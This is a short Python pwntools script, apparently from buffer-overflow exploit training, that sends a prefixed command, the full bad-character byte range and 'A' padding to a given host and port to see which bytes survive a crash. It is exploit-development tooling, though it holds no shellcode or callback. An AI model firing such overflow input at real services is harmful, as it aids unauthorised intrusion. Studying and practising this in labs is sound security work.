#!/bin/python
import argparse
# resolve argv problem with pwn 
import pwnlib.args
pwnlib.args.free_form =False
from pwn import *


# init parser
parser = argparse.ArgumentParser(description=
"""Fuzzing easier
example: python sendbadchar.py -H 192.168.230.128 -P 9999 -p KSTAN
""")
# Remote Host
parser.add_argument('-H','--host',dest='host', help="Set remote target",required=True)
# Host Port
parser.add_argument('-P','--port',dest='port', help="Set remote target port",required=True)
# Prepend an Option
parser.add_argument('-p','--prepend',dest='prepend', help="Set value custom value required before fuzzing payload")
# Specify padding length to recreate crash 
parser.add_argument('-l','--length',dest='pad', help="Set padding length needed",required=True)

args = parser.parse_args()
# set host
host=args.host if args.host  else exit(0)
# set port
port=int(args.port) if args.port else exit(0)
# set prepend value if needed
prepend=args.prepend
prependIsSet=True if prepend else False
pad = int(args.pad) 

badchars = (
  b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

print('[+] Configured Target: {}:{}'.format(host,port))
print("[+] Configured custom prepend value: {}".format(prepend)) if prependIsSet else print("[-] No custom prepend value set")
print('[+] Configured pad length: {}'.format(pad))
padding=b"A"*(pad-len(badchars)-len(prepend)-1) if prependIsSet else b"A"*(pad-len(badchars))

con = remote(host,port)
try:
    print("Welcome Msg: " + con.recvline(timeout=3).decode())
except:
    print('no welcome msg')

print((prepend+" ").encode()  +badchars + padding) if prependIsSet else print(badchars +padding)
con.sendline((prepend+" ").encode()+ badchars+padding)  if prependIsSet else con.sendline( badchars + padding)
print("[1] Output: {}".format(con.recvline(timeout=3).decode()))


